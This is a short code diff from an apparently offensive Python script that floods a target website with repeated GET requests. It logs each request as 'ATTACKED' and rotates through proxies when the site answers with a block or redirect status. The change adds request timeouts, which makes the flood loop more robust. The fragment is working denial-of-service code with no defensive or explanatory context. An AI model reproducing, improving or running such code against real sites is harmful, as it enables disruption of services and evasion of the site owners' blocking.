@@ -130,7 +130,7 @@ def mainth():
         attacks_number = 0
 
         try:
-            attack = scraper.get(site)
+            attack = scraper.get(site, timeout=10)
 
             if attack.status_code >= 302:
                 for proxy in data['proxy']:
@@ -141,13 +141,13 @@ def mainth():
                     response = scraper.get(site)
                     if response.status_code >= 200 and response.status_code <= 302:
                         for i in range(MAX_REQUESTS):
-                            response = scraper.get(site)
+                            response = scraper.get(site, timeout=10)
                             attacks_number += 1
                             logger.info("ATTACKED; RESPONSE CODE: " +
                                         str(response.status_code))
             else:
                 for i in range(MAX_REQUESTS):
-                    response = scraper.get(site)
+                    response = scraper.get(site, timeout=10)
                     attacks_number += 1
                     logger.info("ATTACKED; RESPONSE CODE: " +
                                 str(response.status_code))
